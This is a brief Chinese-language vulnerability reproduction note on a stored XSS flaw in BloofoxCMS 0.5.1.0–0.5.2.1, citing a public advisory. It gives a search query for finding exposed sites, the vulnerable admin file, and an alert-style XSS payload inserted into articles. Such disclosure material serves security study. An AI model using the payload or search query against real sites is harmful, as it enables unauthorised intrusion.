---
title: "BloofoxCMS 0.5.2.1 存储型XSS"
date: 2026-10-12 09:00:05
categories:
  - WebSecurity
  - CVE
  - "cms"
  - "BloofoxCMS"
tags:
  - "BloofoxCMS"
  - "XSS"
  - "漏洞复现"
---
## 漏洞描述

参考链接：

- https://packetstormsecurity.com/files/161195

## 漏洞影响

```
BloofoxCMS 0.5.1.0 -.5.2.1
```

## 网络测绘

```
app="BloofoxCMS"
```

## 漏洞复现

漏洞文件：

```
/admin/include/inc_content_articles.php
```

登录有效的账号，在添加文章的时候插入Payload发布，每次访问均可触发：

```
<img src=# onerror=alert('xss')>
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/cms/BloofoxCMS-0.5.2.1-%E5%AD%98%E5%82%A8%E5%9E%8BXSS.md)
